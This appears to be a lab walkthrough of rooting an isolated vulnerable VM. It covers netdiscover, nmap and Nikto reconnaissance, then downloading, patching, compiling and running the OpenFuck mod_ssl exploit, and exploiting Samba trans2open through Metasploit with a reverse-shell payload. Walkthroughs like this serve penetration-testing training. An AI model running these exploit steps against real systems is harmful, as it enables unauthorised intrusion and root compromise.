Start off by finding the host on your isolated network with NetDiscover:

# netdiscover -r 172.25.1.0/24


Once I find the host, I begin fingerprinting and looking for any services that have vulnerabilities.


Nmap: nmap -sV -O 172.25.1.1 -p 1-65535




Enumeration:

Run Nikto against port 80 on the web server to see if there are any vulnerabilities



display line numbers

We are looking for vulnerabilities that allow us to get a remote shell.
mod_ssl/2.8.4 allows for this. You can look up that vulnerability on the exploit database.

Download the c source code:	
wget https://www.exploit-db.com/download/764 

There is a link in the comments on how to fix the code and then compile it:
http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/

gedit 764, then display line numbers to make the changes from that github link.

I found that I had to take some additional steps to get it to compile on my Kali box:

wget http://security.debian.org/debian-security/pool/updates/main/o/openssl/libssl1.0.0_1.0.1t-1+deb8u5_amd64.deb

dpkg -i libssl1.0.0_1.0.1t-1+deb8u5_amd64.deb

cp 764 764.c
gcc -o openfuck 765.c -lcrypto 

Now that I have my compiled program named  “openfuck”,  I can use it.
usage is ./openfuck_test target box [port] [-c N]

target – supported box eg: 0x00
box – hostname or IP address
port – port for ssl connection
-c open N connections. (use range 40-50 if you don't know)

./openfuck | grep 1.3.20

My Nikto scan showed that the VM is running Apache 1.3.20 on Red-Hat.


I search for that version and I see two possible offsets to use:
0x6a and 0x6b


./openfuck 0x6b 192.168.114 443 -c 50






and voila, we have root!
From here you can run your bash shell commands such as pwd or ls.

Exploiting SMB:


Run enum4linux against the host.
I see that it is running Samb 2.2.1a. I run searchsploit to see if there are any exploits for it.


There is one for a linux box that shows it allows remote code execution. I create a copy of the code. 


Compile the program. 



Run it against the vulnerable VM, and we have root again. 

Alternatively, use Metasploit:

start up metasploit. Make sure the database is running with:
service postgresql start
search for the scanner for smb version using:
search auxiliary/scanner/smb

 
with a little googling, I can find that this version is vulnerable to the trans2open vulnerability. 


Set payload linux/x86/shell_reverse_tcp
use exploit/linux/samba/trans2open
